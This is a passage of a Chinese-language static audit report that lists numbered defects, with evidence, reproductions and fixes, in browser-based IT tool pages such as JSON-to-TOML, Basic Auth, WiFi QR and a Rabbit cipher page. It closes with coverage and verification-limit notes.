- `tools/it/shell-script-formatter.html:214`：FAQ"仅调整空白、不改行为"，但「压缩」插入 `;` 并对 `&&`/`|`/case/heredoc 产出非法脚本（323-325）。
- `tools/it/unit-converter-advanced.html:108`：承诺"压强与能量"两类，下拉与因子表均无（118、222-230）。
- `tools/it/html-entities-encode.html:141`、`:10`：标题/meta"完整编解码"，`NAMED` 仅 39 条（257-269），`&alpha;`/`&hearts;` 解码原样返回（307）。
- 备注：`html-entities-encode` 的「导出明细 CSV」（431）与数据表恒空，属 `textarea` + `*ResText()` 读 `textContent` 的 IT-N140 模板缺陷，本批不重复编号；同页 `:317` 复制依赖全局 `event`，与 IT-N31 同模式，不重复计数；`calc-3.html:139-140`、`ksuid-generator` 等页面加载即写一条历史，属历史模板行为，未单列。

### 覆盖
- 实读 8 页：`tools/it/ksuid-generator.html`、`tools/it/calc-3.html`、`tools/it/matrix-transpose.html`、`tools/it/http-cookies.html`、`tools/it/text-to-ascii.html`、`tools/it/shell-script-formatter.html`、`tools/it/unit-converter-advanced.html`、`tools/it/html-entities-encode.html`。
- 新增 32 条（高 2 / 中 18 / 低 12），编号 IT-N167~IT-N198。
- 未覆盖说明：只审计主流程、边界与文档口径，未逐条核对 FAQ/JSON-LD 文案，未检查同模板其它 IT 页；`html-entities-encode` 的"完整实体覆盖"仅按 `NAMED` 表条目数与解码行为核对，未穷举 2000+ HTML5 命名实体。
- 未做验证：未开浏览器（结论均为源码静态分析 + `node -e` 内存复算，Shell 压缩另用 `bash -n` 校验）、未验证英文态 `?lang=en-US`/繁体/移动端、未跑 `_test_static.py`/`_audit_links.py`/`_audit_assets.py`/`run_gates.py` 等门禁，未触发 `_build.py` 或任何 git 写操作。

### IT-N199 JSON→TOML 键名不加引号，含点/空格/空键时输出非法或语义改变（高，确认缺陷）
- 问题：所有键都按裸键直接拼接。TOML 裸键只允许 `A-Za-z0-9_-`；含 `.` 会被解析成嵌套表，含空格/引号/空串直接语法错误。
- 证据：`tools/it/json-to-toml.html:286`（`s += k + ' = '`）、`:288-292`（表头 `prefix + '.' + k`）、`:178`（无"键名加引号"选项）。
- 复现：输入 `{"a.b":1}` → 实际 `a.b = 1`（TOML 读成表 `a.b`），期望 `"a.b" = 1`；`{"a b":1}` → `a b = 1`（解析报错）；`{"":1}` → ` = 1`。node 复算上述三种输入均未做键引用。
- 影响：`tools/it/json-to-toml.html`
- 方案：按 bare-key 正则判断，不匹配则 `JSON.stringify(k)`；表头 `[[full]]` 同样逐段引用，空键改为报错。
**留存建议（tools/it/json-to-toml.html）**：保留工具（JSON→TOML 是刚需），修键名引用并补 `{a.b / a b / ""}` 回归用例。

### IT-N200 "缩进"下拉与 Tab 预设完全无效（中，确认缺陷）
- 问题：块内 `getIndent` 声明两次（后者读下拉）但全文件从未调用；`toToml` 不接收缩进参数，输出固定无缩进，预设"Tab 缩进"也只写 `indent` 字段。
- 证据：`tools/it/json-to-toml.html:177-181`（下拉）、`:317`、`:322`（两个 `getIndent`）、`:276-295`（`toToml(v, prefix)` 无缩进参与）、`:439`（预设仅改 `indent`）。
- 复现：分别选"2 空格 / 4 空格 / Tab"生成同一 JSON，输出逐字节相同（`node` 按源码函数复算，深度参数未被使用）。
- 影响：`tools/it/json-to-toml.html`
- 方案：把 indent 串传入 `toToml` 递归用于 `[table]`/`[[table]]` 前导空格，或删掉该控件与预设避免假开关。
**留存建议（tools/it/json-to-toml.html）**：该控件属于承诺能力，建议实现而非隐藏。

### IT-N201 null、ISO 日期与混合数组的转换与声明不符（中，确认缺陷）
- 问题：`null` 被写成 `""`（静默改类型）；ISO 日期字符串始终走 `JSON.stringify`，输出带引号字符串，与标题"支持 ISO 日期字符串"不符；对象+标量混合数组落入 `JSON.stringify`，产出 `[{"x":1},2]` 这类非 TOML 内联表。
- 证据：`tools/it/json-to-toml.html:268`（null→`""`）、`:271`（字符串恒加引号）、`:283`（仅"全为对象"才按表数组）、`:273`（对象直出 JSON）。
- 复现：node 复算 `{"n":null}`→`n = ""`；`{"d":"2020-01-01T00:00:00Z"}`→`d = "2020-01-01T00:00:00Z"`；`{"a":[{"x":1},2]}`→`a = [{"x":1}, 2]`（TOML 解析器报错）。
- 影响：`tools/it/json-to-toml.html`
- 方案：null 跳过或转注释；日期用正则输出裸 TOML 日期/时间；混合数组转 `{x = 1}` 内联表或直接报错提示。
**留存建议（tools/it/json-to-toml.html）**：至少修三类硬错误（null、混合数组、日期），并在页脚标注"非 100% TOML 规范"。

### IT-N202 plist `real` 整数值降级为 integer，date/data 往返变 string（中，确认缺陷）
- 问题：`parseFloat` 后靠 `Number.isInteger` 决定回写标签，`<real>1.0</real>` 往返成 `<integer>1</integer>`；`<date>`/`<data>` 解析时只取文本，回写统一 `<string>`，与 meta 宣称支持这四种类型不符。
- 证据：`tools/it/plist-parser.html:270`（real）、`:282`（整数/浮点判定）、`:273-274`（date/data 返回 textContent）、`:283`（字符串回写）、`:10`/`:164`（宣称 date/data）。
- 复现：node 复算 `real 1.0` → `<integer>1</integer>`；`<date>2020-01-01T00:00:00Z</date>` → `<string>...`；`<data>AAECAw==</data>` → `<string>AAECAw==</string>`。
- 影响：`tools/it/plist-parser.html`
- 方案：解析时保留类型包装（如 `{__plistType:'real'|'date'|'data'}`），回写按标记输出；real 不再用 `Number.isInteger` 猜。
**留存建议（tools/it/plist-parser.html）**：保留，补 real/date/data 的往返用例。

### IT-N203 plist 大整数超过 2^53 精度丢失（中，确认缺陷）
- 问题：`<integer>` 用 `parseInt` 转 Number，超过 `Number.MAX_SAFE_INTEGER` 的值被就近改写，且无提示。
- 证据：`tools/it/plist-parser.html:269`。
- 复现：node 复算 `parseInt("9007199254740993")` → `9007199254740992`；期望保留原值或明确告警。
- 影响：`tools/it/plist-parser.html`
- 方案：用 `/^-?\d+$/` 校验后 `BigInt` 保存，超安全整数时以字符串标注；或解析时收集告警并在结果区提示。
**留存建议（tools/it/plist-parser.html）**：修复成本低，建议保留并加边界用例。

### IT-N204 plist 字符串控制字符未转义，可产出非法 XML（低，确认缺陷）
- 问题：`escapeXml` 只替换 `& < >`，JSON 字符串中的 U+0000–U+001F（除 `\t\n\r`）直接写入 XML 1.0，属非法字符，可被本页解析器和其他 plist 工具拒收。
- 证据：`tools/it/plist-parser.html:292`、`:283`。
- 复现：node 复算 `toPlistNode("a\u0001b",0)` 输出含裸 U+0001；把该串喂回本页 `parseInput` 会命中 `parsererror`（`:297`）。
- 影响：`tools/it/plist-parser.html`
- 方案：按 XML 1.0 合法码点过滤/替换非法控制字符，并在结果区提示"已剔除 N 个不可打印字符"。
**留存建议（tools/it/plist-parser.html）**：随 N202/N203 一并修，避免生成"自己都解析不了"的 plist。

### IT-N205 "ASCII 码"行用 UTF-8 字节数判定多字节，纯 ASCII 也被误标（中，确认缺陷）
- 问题：条件 `bytes.length <= 1` 才显示单值，否则前缀"多字节序列"；因此 `Hello`、`admin` 这类纯 ASCII 文本也会被标注为多字节序列，且该行内容与下一行 UTF-8 字节完全重复。
- 证据：`tools/it/char-encoder.html:281`。
- 复现：node 复算 `"Hello"` → `多字节序列: 72, 101, 108, 108, 111`；`"A"` → `65`；期望 ASCII 行按码点输出 `72 101 ...` 或对非 ASCII 标 U+XXXX。
- 影响：`tools/it/char-encoder.html`
- 方案：按码点（`codePointAt(0) <= 127`）判定；ASCII 行输出码点，多字节字符显示"非 ASCII（U+XXXX）"，避免与 UTF-8 行重复。
**留存建议（tools/it/char-encoder.html）**：保留，修标签语义。

### IT-N206 清空后字节视图残留上一段文本（低，确认缺陷）
- 问题：`clearAll` 只清 `#input` 与 `#results`，不碰 `#byteViewBox`，字符/字节表继续显示旧文本。
- 证据：`tools/it/char-encoder.html:381-384`、`:168`（独立 `byteViewBox`）、`:335-337`。
- 复现：输入 `Hello` → 点"清空" → 输入框空、结果空，但字节表仍是 H/e/l/l/o 行（期望整表消失）。
- 影响：`tools/it/char-encoder.html`
- 方案：`clearAll` 内补 `byteViewBox.innerHTML=''`，或直接调用 `convert()` 走空输入分支（`:275` 已实现清空）。
**留存建议（tools/it/char-encoder.html）**：一行修复，建议保留。

### IT-N207 "HTML 命名"只覆盖 9 个字符，与格式名不符（低，确认缺陷）
- 问题：命名实体映射仅 `& < > " ' © ® ™ €` 9 项，其余字符原样输出，且没有 `&nbsp;`；标签叫"HTML 命名"容易让用户以为全量命名实体。
- 证据：`tools/it/char-encoder.html:286-290`、`:174`（格式清单）。
- 复现：输入 `中`/`é` → 该行原样返回 `中`/`é`；期望无命名实体时显示"—"或改用十进制。
- 影响：`tools/it/char-encoder.html`
- 方案：改名"常用 HTML 实体"或补全 HTML5 命名实体表（与 `html-entities-encode.html` 共享数据）。
**留存建议（tools/it/char-encoder.html）**：文案层修复即可。

### IT-N208 用户名含冒号不校验，令牌被服务端按首个冒号切分（中，确认缺陷）
- 问题：RFC 7617 规定 user-id 不得含 `:`，页面直接 `user+':'+pass` 编码，`a:b` + `c` 得到 `a:b:c`，服务端会解成 user=`a`、password=`b:c`，认证错位且用户无感知。
- 证据：`tools/it/basic-auth-generator.html:282`、`:277-281`（无任何输入校验）。
- 复现：node 复算 `btoa("a:b:c")` = `YTpiOmM=`；按 RFC 解码即 user=`a`、pass=`b:c`，与输入不符。
- 影响：`tools/it/basic-auth-generator.html`
- 方案：用户名含 `:` 时阻止生成并提示"用户名不能包含冒号（RFC 7617）"。
**留存建议（tools/it/basic-auth-generator.html）**：保留，补输入校验。

### IT-N209 非 ASCII 凭据按 UTF-8 编码但无 charset 声明，与自身引据矛盾（中，确认缺陷）
- 问题：构造说明写"按 UTF-8 编码"（`btoa(unescape(encodeURIComponent))`），引据表却写"默认 ISO 8859-1，可用 charset 声明 UTF-8"，而页面既不声明 charset 也不提示服务端需支持 UTF-8，服务端按 ISO-8859-1 解码即乱码。
- 证据：`tools/it/basic-auth-generator.html:275`、`:118`、`:210-211`；meta `:8` 还宣称"支持中文用户名"。
- 复现：node 复算 `btoa(unescape(encodeURIComponent("admin:密码")))` 得到 UTF-8 字节令牌；按 ISO-8859-1 解码为 `admin:å¯†ç `（乱码），期望页面提示或提供 ASCII/UTF-8 选项。
- 影响：`tools/it/basic-auth-generator.html`
- 方案：输出区标注"含非 ASCII 时服务端须按 UTF-8 解码（RFC 7617 charset）"，或对非 ASCII 输入给出显式警告。
**留存建议（tools/it/basic-auth-generator.html）**：补一句能力边界说明即可。

### IT-N210 历史快照把密码明文写入 localStorage（中，确认缺陷/隐私）
- 问题：快照遍历页面所有 `input[id]`，`f_pass`（`type=password`）同样被收集，随后写入 TBKit 历史（localStorage），密码长期落盘，同源脚本可读。
- 证据：`tools/it/basic-auth-generator.html:292-299`（收集所有 input，仅排除 button/submit/hidden）、`:127`（`f_pass`）、`:375-378`（`history.record`）。
- 复现：输入 `admin/secret` → 生成 → localStorage 历史 JSON 出现 `"f_pass":"secret"`（静态路径可证，未开浏览器验证键名）。
- 影响：`tools/it/basic-auth-generator.html`
- 方案：快照跳过 `type=password` 或显式排除 `f_pass`；历史只保留 token/请求头，不存原始密码。
**留存建议（tools/it/basic-auth-generator.html）**：安全项，建议优先修。

### IT-N211 复制提示 `i18nText()` 无参，toast 显示 undefined（低，确认缺陷）
- 问题：`copyField` 两处调用 `i18nText()` 不传 key，`i18nText(undefined)` 最终回落 `undefined`，`showToast` 把 `textContent` 设为字符串 "undefined"。
- 证据：`tools/it/basic-auth-generator.html:276`；`js/common.js:1510-1521`（缺 key 时回落 `key` 本身）。
- 复现：点"复制请求头" → 剪贴板内容正确，但提示条出现 `undefined`（源码路径推导，未开浏览器）。
- 影响：`tools/it/basic-auth-generator.html`
- 方案：改为 `i18nText('toast.copied','已复制')` 一类带 key 的调用。
**留存建议（tools/it/basic-auth-generator.html）**：文案层修复。

### IT-N212 自定义字母表超过 256 字符时后半段字符永远不可达（中，确认缺陷）
- 问题：`idx = bytes[i] & mask`，单字节最大 255；字母表长度 257–511 时 mask=511，但索引永远 ≤255，256 及之后的字符被静默排除；`customAlpha` 也无长度上限。
- 证据：`tools/it/nanoid-generator.html:295-296`（mask/step）、`:302-304`（按位与取值）、`:176`（自定义输入无 maxlength）。
- 复现：node 用 300 个不同字符作字母表、100 次采样，`usedMax` 仅 243，索引 >255 从未出现；期望 300 个字符均可能被选中，或 UI 明确限制 256。
- 影响：`tools/it/nanoid-generator.html`
- 方案：字母表 >256 时改用 32 位随机数拒绝采样，或在输入处限制 256 并提示。
**留存建议（tools/it/nanoid-generator.html）**：保留，修上限/采样。

### IT-N213 自定义字母表按 UTF-16 码元处理，emoji 会被拆成孤立代理项（中，确认缺陷）
- 问题：长度、去重与取值都基于 UTF-16 码元，`Array.from` 缺失；一个 emoji 即占 2 个"字符"，`alphabet[idx]` 取到的是半个代理对，生成的 ID 含非法孤立代理项。
- 证据：`tools/it/nanoid-generator.html:285-289`（`a.length`/`new Set(a)`）、`:304`（`alphabet[idx]`）。
- 复现：node 模拟：字母表 `"😀😁"` 的 `length=4`、通过"至少 2 字符"校验；按码元索引可产出 `\uD83D` 或 `\uDE00` 单独半字（复制/粘贴后显示为 �）。
- 影响：`tools/it/nanoid-generator.html`
- 方案：统一 `const chars=Array.from(a)`，用 `chars.length`/`new Set(chars)`/`chars[idx]`。
**留存建议（tools/it/nanoid-generator.html）**：与 N212 同批修。

### IT-N214 历史与图表读取首个 `.result-box`（静态说明块），结果恒为同一段文字（中，确认缺陷）
- 问题：`*ResText()` 用 `document.querySelector('.result-box')`，页面首个该类元素是"📖 NanoID 说明"静态容器，而真正的 `#results` 没有该 class；历史每条记录都写同一段说明前 80 字，图表/趋势恒定。
- 证据：`tools/it/nanoid-generator.html:372`（选择器）、`:190`（说明块 `.result-box`）、`:178`（`#results`）、`:447`（record）。
- 复现：连续生成 8 位与 24 位 ID → 历史两条 `res` 均为"• 默认长度 21 字符…"，期望记录实际生成的 ID 列表。
- 影响：`tools/it/nanoid-generator.html`
- 方案：改为读取 `#results` 内 `textarea/code` 的 `value`，或给结果区加唯一 id 并显式取用它。
**留存建议（tools/it/nanoid-generator.html）**：保留，修历史取值。

### IT-N215 Markdown 单元格不处理既有反斜杠，`a\|b` 会破坏列结构（中，确认缺陷）
- 问题：`escapeMarkdown` 仅把 `|` 换成 `\|`、换行换空格；输入本身含 `\` 时转义串变成 `\\|`，GFM 把 `\\` 当字面反斜杠、`|` 重新成为列分隔符，单元格被拆开。
- 证据：`tools/it/markdown-table-generator.html:257-262`、`:129`（公式只说明"把 `|` 转成 `\|`"）。
- 复现：node 复算 `"a\\|b"`（源文本 `a\|b`）→ `"a\\\\|b"`（源文本 `a\\|b`），渲染列数由 1 变 2；期望先把 `\` 转义为 `\\` 再处理 `|`。
- 影响：`tools/it/markdown-table-generator.html`
- 方案：`replace(/\\/g,'\\\\')` 先于 `replace(/\|/g,'\\|')`，并补用例。
**留存建议（tools/it/markdown-table-generator.html）**：保留，修转义顺序。

### IT-N216 表头/首行实时回写并自动补占位，光标跳末尾、无法删列（中，确认缺陷）
- 问题：两个输入都绑 `oninput="syncColumns()"`，函数把补齐后的值写回 `input.value`；用户键入 `a` 时 cols=3，值立即变 `a,列,列`，光标跳末尾，删掉尾列会被立刻补回。
- 证据：`tools/it/markdown-table-generator.html:148`、`:151`（oninput）、`:309-321`（syncColumns 回写）、`:246`（`C${i+1}` 占位）。
- 复现：node 模拟 `syncColumns(parseRow("a"),3)` → `a,列,列`；期望编辑期不改写输入，生成时再补齐/截断。
- 影响：`tools/it/markdown-table-generator.html`
- 方案：去掉 `oninput` 回写，改为失焦或"生成"时补齐；或仅在内部状态补，不写回输入框。
**留存建议（tools/it/markdown-table-generator.html）**：保留，交互修复。

### IT-N217 行列输入不支持逗号转义，内容含逗号即被拆列（低，确认缺陷）
- 问题：`parseRow` 直接 `split(',')`，没有引号/转义规则；单元格内容含英文逗号时无法表达，会被拆成额外列。
- 证据：`tools/it/markdown-table-generator.html:236-241`、`:147`（说明只写"英文逗号分隔"）。
- 复现：node 复算想输入 `a,b` 与 `c`：写 `"a\\,b,c"` → `["a\\","b","c"]` 3 列，期望 2 列 `["a,b","c"]`。
- 影响：`tools/it/markdown-table-generator.html`
- 方案：支持 CSV 双引号包裹（`"a,b",c`），或提供逐格编辑表格。
**留存建议（tools/it/markdown-table-generator.html）**：文档标注限制或加引号解析。

### IT-N218 WiFi 字符串未按 ZXing 规则转义，含 `;`/`\` 时字段截断（高，确认缺陷）
- 问题：SSID/密码直接拼接，未对 `\ ; , : "` 转义；含分号时后续字段被解析为独立字段，末尾反斜杠还会吞掉结束符；页面注释却明确写"无需手动转义"，与引据表"特殊字符需转义"自相矛盾。
- 证据：`tools/it/wifi-qr-generator.html:235-236`（拼接）、`:175`（"无需手动转义"）、`:110`（引据表要求转义）。
- 复现：node 复算 SSID=`My;AP`、密码=`pw;x` → `WIFI:T:WPA;S:My;AP;P:pw;x;;`，扫码端解析为 S=`My`、P=`pw`（数据缺失）；期望 `S:My\;AP;P:pw\;x;;`。
- 影响：`tools/it/wifi-qr-generator.html`
- 方案：统一转义函数（`\` 先转 `\\`，再对 `; , : "` 前加 `\`），同步修正 `:175` 文案。
**留存建议（tools/it/wifi-qr-generator.html）**：高优修复后再考虑上线推广。

### IT-N219 隐藏网络字段顺序/分号错误：多一个空字段且缺结尾 `;;`（中，确认缺陷）
- 问题：`;H:true` 被追加在已带分号的 `P` 字段后，产生空字段；结尾只补一个 `;`，不符合规范要求的 `;;` 结束。
- 证据：`tools/it/wifi-qr-generator.html:235-236`。
- 复现：node 复算 hidden=true → `WIFI:T:WPA;S:MyHomeAP;P:secret123;;H:true;`；期望 `WIFI:T:WPA;S:MyHomeAP;P:secret123;H:true;;`；nopass 隐藏同样得到 `...S:x;;H:true;`。
- 影响：`tools/it/wifi-qr-generator.html`
- 方案：按字段数组拼接（`T,S,P,H` 后统一 join(';')），末尾固定 `;;`，H 置于 P 之后、结束符之前。
**留存建议（tools/it/wifi-qr-generator.html）**：与 N218 同批修。

### IT-N220 名为"二维码生成器"却不生成二维码（中，确认缺陷/承诺不符）
- 问题：标题、H1、面包屑均为"WiFi 配网二维码生成器"，简介/公式说明写"生成 WiFi 配网二维码""任何扫码 App 都能识别"，但页面无 QR 库、canvas 或图像输出，只产出 `WIFI:` 文本并要求"复制后交给二维码工具"。
- 证据：`tools/it/wifi-qr-generator.html:10`、`:83`、`:103`、`:105`、`:236`（仅字符串输出）。
- 复现：点击"生成" → 页面只有文本域与复制按钮，无可扫描图像；期望至少输出可保存的二维码图片。
- 影响：`tools/it/wifi-qr-generator.html`
- 方案：内置纯前端 QR 渲染（无后端），或把页面改名为"WiFi 配网字符串生成器"并在首句说明需外部二维码工具。
**留存建议（tools/it/wifi-qr-generator.html）**：若不做 QR，务必改名以免误导。

### IT-N221 两处 `</div` 缺少 `>`，存在结构/残留文本风险（低，确认缺陷）
- 问题：HTML 中出现两个未闭合的结束标签片段 `</div`（无 `>`），解析器的错误恢复可能把残留字符当文本或改变嵌套。
- 证据：`tools/it/wifi-qr-generator.html:128`、`:134`。
- 复现：静态阅读确认；浏览器容错后的实际渲染未实测（未开浏览器），故标"低/待验证"。
- 影响：`tools/it/wifi-qr-generator.html`
- 方案：补全为 `</div>`。
**留存建议（tools/it/wifi-qr-generator.html）**：顺手修，成本 2 个字符。

### IT-N222 "图表"页签默认隐藏结果区，"数据表"页签显示的却是结果卡片（中，确认缺陷）
- 问题：初始化调用 `__pssShow('chart')`，把整个 `#result`（PPI、尺寸、分辨率及机型表）设为 `display:none`；只有点"数据表"才显示结果，而真正的 TBKit 数据表（`#phone_screen_sizesTable`）没有页签入口，标签语义与内容错位。
- 证据：`tools/it/phone-screen-sizes.html:367-372`（`__pssShow`）、`:379`（默认 chart）、`:145`（`#result`）、`:152-155`（页签）。
- 复现：打开页面 → 计算结果不可见，只见 PPI 曲线；点"数据表" → 出现结果卡片而非表格；期望默认展示结果或页签改名为"结果/图表"。
- 影响：`tools/it/phone-screen-sizes.html`
- 方案：默认 `display:''` 且保留图表切换；页签改为"结果+图表 / 历史"，或把机型表放进"数据表"面板。
**留存建议（tools/it/phone-screen-sizes.html）**：保留，调整默认态与标签。

### IT-N223 宣称可查 DPR，参数表却无 DPR/CSS 视口，且分辨率书写顺序前后不一（中，确认缺陷）
- 问题：体验清单和 FAQ 反复讲 DPR（"查主流机型分辨率与 DPR 做适配"），但 10 款机型表只有尺寸/分辨率/PPI 四列，无 DPR、无 CSS 视口，也无 DPR 计算；同一台 iPhone 15 Pro 在表格写 `2556×1179`、示例写 `1179×2556`，顺序不统一。
- 证据：`tools/it/phone-screen-sizes.html:178-179`（宣称）、`:272-282`（表）、`:291-294`（表头）、`:181`（示例顺序）、`:184-185`（FAQ 讲 DPR）。
- 复现：node 反算 iPhone 15 Pro：物理 1179×2556、DPR=3 → CSS 视口 393×852；页面任何输出均无此两项。10 款机型 PPI 用 `√(w²+h²)/英寸` 复算全部与表值一致（460/460/460/326/416/460/440/450/452/510），仅信息维度缺失。
- 影响：`tools/it/phone-screen-sizes.html`
- 方案：表增加 DPR、CSS 视口列并统一"N×M（宽×高）"书写；或删掉 DPR 相关宣称。
**留存建议（tools/it/phone-screen-sizes.html）**：保留（PPI 数据准确），补 DPR 列即可显著提升实用性。

### IT-N224 meta/og/twitter 描述整句重复 2–3 遍（低，确认缺陷）
- 问题：描述中"手机屏幕尺寸速查是一款免费的在线IT 开发工具"重复两次，"纯前端运行…"重复两次，og/description/twitter/JSON-LD 四处同文。
- 证据：`tools/it/phone-screen-sizes.html:13`、`:16`、`:33`、`:36`（JSON-LD 同文）。
- 复现：直接读取 meta 文本即可见连续重复短语。
- 影响：`tools/it/phone-screen-sizes.html`
- 方案：去重为单句，并保留"常见机型 PPI 速查"作为差异化描述。
**留存建议（tools/it/phone-screen-sizes.html）**：SEO 文案修复即可。

### 承诺 vs 实际（Q 批专项）
- `tools/it/json-to-toml.html:10`、`:20`：宣称支持"ISO 日期字符串"，实际 `:271` 对所有字符串加引号，日期不会输出为 TOML 日期（见 N201）。
- `tools/it/json-to-toml.html:172`："校验"按钮（`:321` `doValidate(){doToml();}`）只是再转换一次，不校验 TOML 语法，也不校验 JSON 语义（如重复键、超大数）。
- `tools/it/json-to-toml.html:177-180`：缩进下拉与 `:439` Tab 预设无输出效果（见 N200）。
- `tools/it/plist-parser.html:10`、`:164`：宣称支持 date/data，实际 `:273-274` 只取文本、`:283` 回写为 string（见 N202）。
- `tools/it/char-encoder.html:174`：格式清单列出 **Punycode**，但 `:280` 起的 `formats` 数组与全文件均无 Punycode 实现/输出行（新增发现，未单列编号）。
- `tools/it/nanoid-generator.html:194`：写"21 字符约 122 位熵"，而 `:227`/`:246` 写 126 位；64 字符表下 21×6=126 bit，`:194` 数值错误（"约 4 年"沿用官方 350M ID/s 口径，按 126 位成立）。
- `tools/it/markdown-table-generator.html:154`："导出明细 CSV"（`:418`）导的是历史表，且 `:339-345` 读取 `#output`（textarea）的 `textContent` 恒为空，历史/图表/导出实际无数据——属 IT-N140 模板缺陷，不重复编号。
- `tools/it/wifi-qr-generator.html:103`：宣称"任何扫码 App 都能识别"；但 `:235-236` 不转义特殊字符（N218），隐藏网络字符串还缺 `;;`（N219），且 `:175` 与 `:110` 对"是否需要转义"自相矛盾。
- `tools/it/wifi-qr-generator.html:83`、`:103`、`:105`：页面名为"二维码生成器"、简介称"生成二维码"，实际不生成 QR（N220）。
- `tools/it/phone-screen-sizes.html:16`：宣称"输入参数即可实时得出结果"，但全页无 `input` 监听，只有"计算"按钮 `onclick`（`:147` 附近），属文案夸大（未单列）。
- `tools/it/phone-screen-sizes.html:178-179`：宣称可查 DPR 做适配，页面无 DPR 数据/计算（N223）。
- `tools/it/basic-auth-generator.html:8`：宣称"支持中文用户名"，实际 UTF-8 编码但不声明 charset，ISO-8859-1 服务端会乱码（N209）。
- 通用：本批 8 页"导出明细 CSV"均为历史表导出（如 `json-to-toml.html:433`、`markdown-table-generator.html:418`），不导出当前结果；未单列编号。

### 覆盖
- 实读 8 页：`tools/it/json-to-toml.html`、`tools/it/plist-parser.html`、`tools/it/char-encoder.html`、`tools/it/basic-auth-generator.html`、`tools/it/nanoid-generator.html`、`tools/it/markdown-table-generator.html`、`tools/it/wifi-qr-generator.html`、`tools/it/phone-screen-sizes.html`。
- 新增 26 条（高 2 / 中 17 / 低 7），编号 IT-N199~IT-N224；本批无重号（上一批止于 IT-N198）。
- 未覆盖说明：只审计主流程、边界与文档口径，未逐条核对 FAQ/JSON-LD 文案（仅发现 `phone-screen-sizes` 描述整句重复并单列）；未穷举 plist 全部数据类型、未测试二进制 bplist00（页面已明确不支持）；WiFi QR 未实际扫码验证；屏幕参数表仅复算 PPI 与分辨率/尺寸自洽性，未核对 10 款机型官方规格的发布时间与市场版本。
- 未做验证：未开浏览器（结论均为源码静态分析 + `node -e` 内存复算）、未验证英文态 `?lang=en-US`/繁体/移动端、未跑 `_test_static.py`/`_audit_links.py`/`_audit_assets.py`/`run_gates.py` 等门禁，未触发 `_build.py` 或任何 git 写操作。

### IT-N225 Rabbit 进位用 `t>>>32`，等于取低 32 位，密钥流偏离标准（高，确认缺陷）
- 问题：`next()` 用 `carry=t>>>32` 取 32 位加法的进位。JS 的 `>>>` 会把移位量按 32 取模，`t>>>32 === t>>>0`，得到的是和的低 32 位（十亿量级）而不是 0/1 进位；该值随即被加进下一个状态字，并在末尾 `C[0]=(C[0]+carry)>>>0` 再加一次。
- 证据：`tools/it/rabbit.html:333`（`carry=t>>>32;`）、`:335`（把错误进位加回 C[0]）、`:154`（说明写"进位取和右移 32 位的结果"）。
- 复现：node 复刻 `next()` 并打印前 16 次进位 = `1295344757, 545429832, 1431692924, 2727000521, …`，无一是 0/1；单步对照 `t=0xFFFFFFFF+0x4D34D34D` → `t>>>32 = 1295307596`，数学右移应为 `1`。加/解密仍可逆（密钥流确定），但密钥流与 RFC 4503 不一致。
- 影响：`tools/it/rabbit.html`
- 方案：改为 `carry = Math.floor(t / 4294967296)`（或 `(t / 0x100000000) | 0`），循环后 `C[0]=(C[0]+carry)>>>0; carry=0;`，并补一组 RFC 4503 测试向量做自检。
**留存建议（tools/it/rabbit.html）**：这是全页唯一"算法真错"的点，必须修；修完用官方向量回归。

### IT-N226 密钥按文本截断，与"32 hex 字符"标签及"每 4 字节拼 1 字"说明均不符（高，确认缺陷）
- 问题：`getKey()` 把密钥串直接 `strToBytes` 后 `slice(0,16)`，即"取前 16 个**字符**"；但 label 承诺"16字节 = 32 hex字符"，公式说明又称"取密钥字节每 4 个拼成一个 32 位字"。实际 `:311` 先按"2 字节小端 + 4 字节补 0"算一遍，`:312` 立即用"2 字节大端"覆盖，`:311` 成为死代码。
- 证据：`tools/it/rabbit.html:181`（label）、`:154`（说明"每 4 个字节"）、`:311-313`（同一 `X[i]` 连写两次）、`:373`（`slice(0,16)`）、`:370`（密钥清空时返回 15 字节的 `defaultkey12345`，未补齐 16）。
- 复现：node 实算，key=`00112233445566778899aabbccddeeff`（32 hex）→ UTF-8 得 32 个 ASCII 字节 → 取前 16 字符 `0011223344556677` → `X[0]=0x30303131`；若按 label 的 hex 语义应为 `0x00112233`。同理 `X[1]=0x33343535`。
- 影响：`tools/it/rabbit.html`
- 方案：先判 `/^[0-9a-fA-F]{32}$/`（或 `{16}` 文本）再决定"hex 字节装入"还是"UTF-8 文本补齐"；删掉 `:311` 死代码，按 RFC 4503 §2.1 的 4 字节小端装入重写，并在界面回显实际装入的 16 字节。
**留存建议（tools/it/rabbit.html）**：与 N225 同批修，否则"标准 Rabbit"的说法不成立。

### IT-N227 密文基数靠猜、非法 IV 静默变全 0（中，确认缺陷）
- 问题：解密时先按正则猜 Hex，再退回 Base64；`getIV()` 对非 hex 输入把 `parseInt` 的 NaN 写进 `Uint8Array`（自动存 0），只要长度 ≥8 就当作"全 0 IV"并额外空转 4 轮，既不报错也不提示。
- 证据：`tools/it/rabbit.html:395`（`/^[0-9a-fA-F\s]+$/` + 偶数长度判定）、`:379-380`（`hexToBytes` 长度 ≥8 即返回，否则退回文本）、`:317-322`（IV 只要非 null 就异或并多跑 4 轮）。
- 复现：node（1）IV=`abcdefghijklmnop`（16 字符、全非 hex）→ `hexToBytes` 得 8 个 0 → 页面按"零 IV"处理，结果与留空 IV 不同，无任何提示；（2）密文 `abcd` 既是合法 Base64（atob 得 3 字节）又符合 hex 正则且长度为偶 → 被判为 Hex 解 2 字节，明文错乱。
- 影响：`tools/it/rabbit.html`
- 方案：解密格式跟随已有的 `#outputFormat`（Hex/Base64 下拉）而不是猜；IV 严格校验 `/^[0-9a-fA-F]{16}$/` 或明确"按 UTF-8 文本补齐 8 字节"，长度不符时报错而非静默补 0。
**留存建议（tools/it/rabbit.html）**：改下拉联动即可，成本低、收益直接。

### IT-N228 GRANT 示例使用 MySQL 8.0 已移除的 `IDENTIFIED BY` 子句（中，确认缺陷）
- 问题：权限条目照抄 5.6 时代写法 `GRANT ... TO user IDENTIFIED BY 'pwd'`。`IDENTIFIED BY` 在 5.7.6 起废弃、8.0 已移除，8.0/8.4 执行直接 1064 语法错误；且 GRANT 后的 `FLUSH PRIVILEGES` 并非必需（只有直接改 grant 表才需要）。
- 证据：`tools/it/mysql-cheatsheet.html:643`（syntax）、`:645`（example）、`:653`（REVOKE 写法正常，可作对照）。
- 复现：静态对照 MySQL 8.0 手册 GRANT 语法（已无 `IDENTIFIED BY`）；正确顺序为 `CREATE USER 'app'@'%' IDENTIFIED BY 'secret'; GRANT SELECT, INSERT ON mydb.* TO 'app'@'%';`。本机无 MySQL，未实跑，仅按官方语法判定。
- 影响：`tools/it/mysql-cheatsheet.html`
